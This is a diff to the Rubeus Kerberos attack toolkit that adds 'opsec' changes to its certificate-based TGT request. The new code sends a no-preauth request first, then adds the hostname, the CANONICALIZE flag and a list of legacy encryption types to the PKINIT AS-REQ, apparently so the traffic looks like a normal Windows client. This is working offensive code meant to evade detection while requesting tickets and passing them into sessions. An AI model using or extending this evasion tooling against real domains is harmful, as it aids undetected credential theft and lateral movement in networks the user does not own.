@@ -187,6 +187,31 @@ namespace Rubeus {
         }
 
         public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false, string servicekey = "", bool getCredentials = false, string proxyUrl = null, string service = null, bool changepw = false) {
+            Console.WriteLine("[TEMP] Called Certificate variant of Ask.TGT");
+
+            // CUSTOM BEGIN
+
+            bool opsec = true; // TEMP!!!! TODO implement as paramter
+
+            bool preauth = false;
+            if (opsec)
+            {
+                Console.WriteLine("[TEMP] opsec is true, doing nopreauth request!");
+                try
+                {
+                    preauth = NoPreAuthTGT(userName, domain, "", etype, domainController, outfile, ptt, luid, describe, true, proxyUrl);
+                }
+                catch (KerberosErrorException err)
+                {
+                    Console.WriteLine("[TEMP] Got KerberosErrorException, but propably not relevant!");
+                    Console.WriteLine(err.ToString());
+                }
+            }
+
+            Console.WriteLine("[TEMP] Preauth succes? " + preauth);
+
+            // CUSTOM END
+
             try {
                 X509Certificate2 cert = FindCertificate(certFile, certPass);
 
@@ -207,6 +232,28 @@ namespace Rubeus {
                 Console.WriteLine("[*] Building AS-REQ (w/ PKINIT preauth) for: '{0}\\{1}'", domain, userName);
 
                 AS_REQ pkinitASREQ = AS_REQ.NewASReq(userName, domain, cert, agreement, etype, verifyCerts, service, changepw);
+
+                // CUSTOM BEGIN
+
+                // TODO move this to the overloaded AS_REQ.NewASReq function above!!! (orient on the overload with the keyString param!!!)
+                // TODO IDEA: Outsource req_body adjustements to an own function (e.g. ApplyOpsecAdjustments(req_body))
+
+                // opsec stuff
+                string hostName = System.Net.Dns.GetHostName();
+                List<HostAddress> addresses = new List<HostAddress>();
+                addresses.Add(new HostAddress(hostName));
+                pkinitASREQ.req_body.addresses = addresses;
+                pkinitASREQ.req_body.kdcOptions = pkinitASREQ.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;
+                pkinitASREQ.req_body.etypes.Add(Interop.KERB_ETYPE.rc2CBC_EnvOID); // 12
+                pkinitASREQ.req_body.etypes.Add(Interop.KERB_ETYPE.des_ede3_cbc_Env_OID); // 15
+                pkinitASREQ.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
+                pkinitASREQ.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);
+                pkinitASREQ.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac_exp);
+                pkinitASREQ.req_body.etypes.Add(Interop.KERB_ETYPE.old_exp);
+                pkinitASREQ.req_body.etypes.Add(Interop.KERB_ETYPE.des_cbc_md5);
+
+                // CUSTOM END
+
                 return InnerTGT(pkinitASREQ, etype, outfile, ptt, domainController, luid, describe, true, false, servicekey, getCredentials, proxyUrl);
 
             } catch (KerberosErrorException ex) {
